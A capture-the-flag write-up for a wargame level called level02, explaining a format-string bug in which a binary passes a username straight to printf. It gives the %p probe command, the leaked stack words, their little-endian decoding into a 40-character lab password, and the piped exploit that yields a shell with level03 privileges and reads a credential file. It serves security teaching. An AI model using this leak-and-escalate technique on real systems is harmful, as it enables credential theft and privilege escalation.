# level02

## Objective

Read the password stored for `level03` and use the binary's normal success
branch to obtain a shell with `level03` effective permissions.

## Vulnerability

The binary reads `/home/users/level03/.pass` into a local 41-byte stack buffer.
It then accepts a username and password. When the password comparison fails,
the username is passed directly as the first argument to `printf`:

```c
printf(user_name);
```

The username is therefore a format string. `%p` directives cause `printf` to
read values from its variadic argument area and stack, including the nearby
stored password. The binary is 64-bit, so each leaked value represents eight
bytes that must be decoded in little-endian byte order.

## Password leak

Supply a 30-word probe as the username and an arbitrary incorrect password:

```sh
python -c 'print "|".join(["%p"] * 30); print "x"' | ./level02
```

The 22nd through 26th leaked values were:

```text
0x756e505234376848
0x45414a3561733951
0x377a7143574e6758
0x354a35686e475873
0x48336750664b394d
```

Reading each 64-bit word from its least-significant byte to its most-significant
byte yields:

```text
Hh74RPnu | Q9sa5JAE | XgNWCqz7 | sXGnh5J5 | M9KfPg3H
```

The recovered 40-character password is:

```text
Hh74RPnuQ9sa5JAEXgNWCqz7sXGnh5J5M9KfPg3H
```

## Exploit

Provide any ordinary username and the recovered password. The trailing `cat`
keeps standard input attached to the shell launched by the program:

```sh
(python -c 'print "level02"; print "Hh74RPnuQ9sa5JAEXgNWCqz7sXGnh5J5M9KfPg3H"'; cat) | ./level02
```

The binary prints `Greetings, level02!` and executes `system("/bin/sh")`.
Verify the privilege transition and read the next password:

```sh
id
cat /home/users/level03/.pass
```

Observed identity:

```text
uid=1002(level02) gid=1002(level02) euid=1003(level03) egid=100(users)
```

The contents of `/home/users/level03/.pass` were identical to the accepted
password and are recorded in `flag`.